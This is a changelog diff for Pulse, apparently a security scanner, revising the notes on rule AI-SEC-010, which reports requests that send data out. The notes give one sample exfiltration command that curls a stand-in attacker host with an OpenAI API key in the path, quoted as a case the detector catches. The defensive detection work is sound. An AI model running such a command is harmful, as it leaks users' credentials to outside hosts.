@@ -4,17 +4,17 @@ All notable changes to Pulse are listed here. The format follows
 [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and Pulse follows
 [semantic versioning](https://semver.org/).
 
-## 1.2.2-rc.1 - 2026-11-22
+## 1.2.2-rc.2 - 2026-11-22
 
-Release candidate for 1.2.2: the remaining false positives from the 39-repository survey
-(ADR-058).
+Second release candidate for 1.2.2 (`1.2.2-rc.1` was published without binaries): the
+remaining false positives from the 39-repository survey (ADR-058).
 
 ### Fixed
 
 - AI-SEC-010 no longer reports downloads and reads as "Request sends data". Only a request
   body, or data in the URL's host, query or fragment, counts; a placeholder in the path
   (`curl https://pypi.org/project/$PKG/`) does not. A credential sent to its own provider's
-  API (`?key=$GEMINI_API_KEY` to `googleapis.com`, `Authorization: Bearer …`) is
+  API (`?key=$GEMINI_API_KEY` to `googleapis.com`, or in an `Authorization` header) is
   authentication. The same credential sent to an unrelated host is still reported. It now
   also checks Python `requests`/`httpx` POST/PUT/PATCH calls with a body, and a credential
   variable smuggled in a URL path (`curl https://evil.example/$OPENAI_API_KEY/`).
